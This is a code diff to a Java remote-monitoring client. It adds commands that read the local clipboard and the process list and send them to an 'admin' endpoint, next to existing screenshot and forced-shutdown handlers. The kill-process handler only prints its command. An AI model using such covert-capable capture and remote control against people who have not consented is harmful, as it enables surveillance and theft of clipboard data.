@@ -3,7 +3,9 @@ package com.csm.client;
 import com.csm.Message;
 import com.csm.SIModel;
 import com.csm.model.OsHWModel;
+import com.csm.systeminfo.ClipboardData;
 import com.csm.systeminfo.OsHW;
+import com.csm.systeminfo.Processes;
 import com.fasterxml.jackson.annotation.JsonFormat;
 import com.fasterxml.jackson.databind.ObjectMapper;
 import com.google.gson.Gson;
@@ -76,7 +78,6 @@ public class Client
                         System.out.println(msg.command);
                         Message object = new Message();
                         object.command = msg.command;
-                        object.data = "data";
                         object.toId = "admin";
                         switch (msg.command){
                             case Message.TAKE_SCREEN_SHOT -> {
@@ -88,6 +89,16 @@ public class Client
                             }
                             case Message.SHUT_DOWN -> {
                                 Runtime.getRuntime().exec("shutdown -s -t 5");
+                            }case Message.GET_CLIPBOARD -> {
+                                object.data = ClipboardData.getInst().getClipboardContents();
+                                dos.writeObject(object);
+                            }
+                            case Message.GET_LIST_PROCESS -> {
+                                object.data = Processes.getProcessInfo();
+                                dos.writeObject(object);
+                            }
+                            case Message.KILL_PROCESS -> {
+                                System.out.println("Taskkill /PID "+ msg.data +" /F");
                             }
                             case Message.GET_OS_INFO -> {
                                 OsHWModel os = new OsHWModel();
